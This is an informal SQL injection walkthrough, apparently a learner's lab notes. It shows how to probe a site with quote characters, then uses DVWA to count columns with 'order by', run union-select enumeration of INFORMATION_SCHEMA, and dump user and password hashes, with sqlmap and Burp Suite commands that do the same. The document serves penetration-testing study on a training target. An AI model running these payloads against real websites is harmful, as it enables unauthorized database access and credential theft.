First you test if sql injection exist in a site
     
     To test that you must ask yourself if what website is doing from where you want to inject a sql command, it interact with database

               If it interact with database, you are good to go && if not,bad luck for sql injection

     Check if sql injection exist in that function of website

               NOTE: sql injection exist if that website did not sanitize characters such as ', and many more

               To check for sql injection, test by ' or " in that site if it brings any error

               if it bring you are good to go && if it does not, no luck && try to do more bypass restriction if you are sure that website, it has sql injection

     Next stage try to find out what kind of database the webisite operate

          #For this I will show for Mysql
      
     After that, what kind of injection that database we can retrieve data from database

          Also if there some restriction in case of , and other characters, try to bypass them with

            GITHUB PAGE FOR SQL INJECTION AND EVEN BYPASS: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL Injection

    Example:


     DVWA SQL INJECTION security: low


     first test for ' #SUCCESS FOR SQL INJECTION-- since it bring error && luck for us it bring error of Mysql

     second the database explain in first error with this ' in which it is Mysql

     third we have to find what kind of injection we can do to Mysql

          Let us start with "order by" to what number of columns database has 

                1. ' order by 1-- -   No error for this
                2. ' order by 2-- -   Also No error
                3. ' order by 3-- -   We get error that "Unknown column '3' in 'order clause'" ,you might get different error

                From error, we know that there are two columns

          After let us try union select

            since we know there are two column let us check for those two

                1. ' union select 1,2-- -
                 It works by bring data from the column that has effect from sql injection
                        From here, it bring 1 && 2 columns that has effect for sql injection

                 More verification, let us try if we can change value by using union injection

                      1. ' union select "blackninja23","Hack"-- -

                      We overide the value for those columns both 1 && 2 so both has sql injection error

         Let retrieve data from database from those affected columns 1&&2

               1.Let us know the user of this database from either 1 or 2 columns since there are both affected columns

                   Using ' union select (user()),(user())-- -
                        the user is dvwa@localhost

               2.Check for name of database

                     Using ' union select (select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA),2-- -


                        where by group_concat will help us to merge data since there are many data from different columns

                        We have information_schema && dvwa----database name

                     Try to separate data we try separator if it works

                              Using ' union select (select group_concat(SCHEMA_NAME SEPARATOR '\n') from INFORMATION_SCHEMA.SCHEMATA),2-- -

                              I works

                3.Check for tables in database "dvwa"

                           Using ' union select (select group_concat(TABLE_NAME SEPARATOR '\n') from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = 'dvwa'),2-- -


                4. Check for columns for their respective tables

                            ' union select (select group_concat(TABLE_NAME ,":", COLUMN_NAME SEPARATOR '\n')from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = 'dvwa'),2-- -


                                 we have interest informations for users-- user && password

                5. Retrieve data "user "&&"password" from table "users" from database "dvwa"

                        Notes that in here we use their value to extract data from databases
                        we specify columns for user && password from database "dvwa" in table "users"

                                ' union select (select group_concat(user," ",password SEPARATOR '\n')from dvwa.users),2-- -

                        We have successful retrieve name for users and their password

                           For more information of users


                               ' union select (select group_concat(user," ",password," ",first_name," ",last_name SEPARATOR '\n')from dvwa.users),2-- -


    Also you can try SQLMAP in DVWA SQL INJECTION, it works just fine


        I did with sqlmap too but with use of burp suite


        where by you intercept message after try with to put any value in that website(for this it was id so i put 1)
        Then you save the request from burpsuite

        After that, you run sqlmap to test for it If it works

                 sqlmap -r dvwa.sql

                 It works for sqlmap



        Retrieve databases

                sqlmap -r dvwa.sql --dbs

                We have two database which are dvwa and information_schema

        Retrieve tables

            -D for specification of database "dvwa"
            --tables looking for tables in database "dvwa"

                sqlmap -r dvwa.sql -D dvwa --tables

                 We have two tables which are guestbook && users

        Retrieve columns

               -D for specification of database "dvwa"
               -T for specification of table "users"
               --columns looking for columns in table "users" from database "dvwa"

                 sqlmap -r dvwa.sql -D dvwa -T users --columns

                     we find many columns but interest columns are user and password

        Retrieve data 

                  -D for specification of database "dvwa"
                  -T for specification of table "users"
                  -C for specification of columns "user" and password(interest columns)
                  --dump this enable us to see contents from user && password from table "users" in database "dvwa"

                           sqlmap -r dvwa.sql -D dvwa -T users -C user,password --dump

                              we find their values
